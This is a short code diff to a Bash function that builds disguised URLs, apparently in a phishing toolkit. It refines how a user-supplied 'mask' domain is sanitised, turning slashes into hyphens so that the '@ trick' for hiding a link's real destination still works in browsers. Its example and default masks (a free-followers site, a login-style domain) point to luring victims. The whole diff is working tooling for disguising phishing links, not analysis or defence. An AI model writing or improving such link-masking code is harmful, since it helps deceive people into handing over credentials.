@@ -462,9 +462,17 @@ custom_mask() {
 		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
 		read -e -p "${WHITE} ==> ${ORANGE}" mask_url
 		[[ -z "$mask_url" ]] && mask_url="https://connexion-systeme-gestion" # Default
-		# Clean up double https:// if user pasted over it
-		mask_url=$(echo "$mask_url" | sed 's|^https://https://|https://|')
-		mask=$mask_url
+		# Robustly clean up any double/messed up https:// prefixes
+		mask_url=$(echo "$mask_url" | sed -E 's|^(https?://)+|https://|g')
+		mask_url=$(echo "$mask_url" | sed -E 's|^https://[a-zA-Z0-9.-]*https?://|https://|g')
+		
+		# If user included a path (with /), replace / with - because / breaks the @ trick in modern browsers
+		if [[ "$mask_url" == */* ]]; then
+			mask_path_clean=$(echo "$mask_url" | sed 's|^https://||' | sed 's|/|-|g')
+			mask="https://$mask_path_clean"
+		else
+			mask=$mask_url
+		fi
 		echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
 	fi
 }
